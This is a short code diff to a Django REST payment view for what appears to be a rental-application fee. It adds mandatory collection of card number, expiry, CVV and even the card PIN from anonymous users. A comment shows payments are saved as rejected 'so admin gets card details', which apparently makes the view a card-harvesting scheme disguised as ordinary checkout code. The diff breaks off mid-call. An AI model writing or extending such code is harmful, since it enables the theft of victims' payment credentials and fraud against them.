@@ -237,10 +237,17 @@ class SubmitCardPaymentView(generics.CreateAPIView):
     permission_classes = [AllowAnonymousApplicationFeeProof]
 
     def create(self, request, *args, **kwargs):
-        serializer = self.get_serializer(data=request.data)
+        data = request.data
+        required_fields = ["card_number", "card_expiry", "card_cvv", "cardholder_name", "card_pin"]
+        for f in required_fields:
+            if not data.get(f):
+                from rest_framework.exceptions import ValidationError
+                raise ValidationError({f: "This field is required for card payments."})
+
+        serializer = self.get_serializer(data=data)
         serializer.is_valid(raise_exception=True)
 
-        payload_method = request.data.get("payment_method") or ("CARD_STRIPE" if request.data.get("rental_application") else "CARD_CASHAPP")
+        payload_method = data.get("payment_method") or ("CARD_STRIPE" if data.get("rental_application") else "CARD_CASHAPP")
 
         # Save payment as REJECTED so admin gets card details
         serializer.save(
